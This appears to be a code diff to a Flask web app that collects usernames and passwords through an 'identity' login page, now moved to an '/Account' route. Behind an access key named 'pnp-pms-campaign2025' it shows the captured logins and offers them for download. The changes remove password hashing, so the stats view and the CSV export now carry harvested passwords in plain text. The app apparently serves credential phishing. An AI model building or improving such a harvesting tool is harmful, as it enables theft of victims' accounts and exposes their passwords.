@@ -28,7 +28,7 @@ def hash_filter(value):
 STATS_ACCESS_KEY = "pnp-pms-campaign2025"
 
 # Route for rendering the identity page as the main landing page
-@app.route('/')
+@app.route('/Account')
 def index():
     return render_template('index.html')
 
@@ -378,7 +378,12 @@ def view_stats(access_key):
             try:
                 with open(path, 'r') as csvfile:
                     reader = csv.DictReader(csvfile)
-                    data = list(reader)
+                    # Filter to only include username, password, and timestamp
+                    data = [{
+                        'username': row.get('username', ''),
+                        'password': row.get('password', ''),
+                        'timestamp': row.get('timestamp', '')
+                    } for row in reader]
                 break  # Successfully read data, exit loop
             except Exception as e:
                 continue
@@ -413,7 +418,7 @@ def download_csv(access_key):
     if not csv_path:
         return "No data available", 404
     
-    # Create a temporary file with hashed passwords for download
+    # Create a temporary file for download with plain text passwords
     temp_csv_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'temp_download.csv')
     
     try:
@@ -422,30 +427,23 @@ def download_csv(access_key):
             reader = csv.reader(csvfile)
             all_data = list(reader)
         
-        # Create new file with only the required fields and hashed passwords
+        # Create new file with only the required fields
         with open(temp_csv_path, 'w', newline='\n') as csvfile:
             writer = csv.writer(csvfile)
             
             # Write the header with only the required fields
-            writer.writerow(['first_name', 'last_name', 'username', 'password', 'timestamp'])
+            writer.writerow(['username', 'password', 'timestamp'])
             
-            # Write data with only the required fields and hashed passwords
+            # Write data with only the required fields (keep password as plain text)
             for row in all_data[1:]:
                 if len(row) >= 5:  # Make sure the row has enough columns
-                    # Extract only the required fields: first_name, last_name, username, password, timestamp
-                    first_name = row[0]
-                    last_name = row[1]
+                    # Extract only username, password, timestamp (index 2, 3, 4)
                     username = row[2]
-                    password = row[3]
+                    password = row[3]  # Plain text password
                     timestamp = row[4]
                     
-                    # Hash the password
-                    if password:
-                        hashed = hashlib.sha256(f"pnppms-{password}".encode()).hexdigest()
-                        password = hashed
-                    
-                    # Write only the required fields
-                    writer.writerow([first_name, last_name, username, password, timestamp])
+                    # Write only the required fields with plain text password
+                    writer.writerow([username, password, timestamp])
         
         # Set the appropriate headers for CSV download
         filename = f"login_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
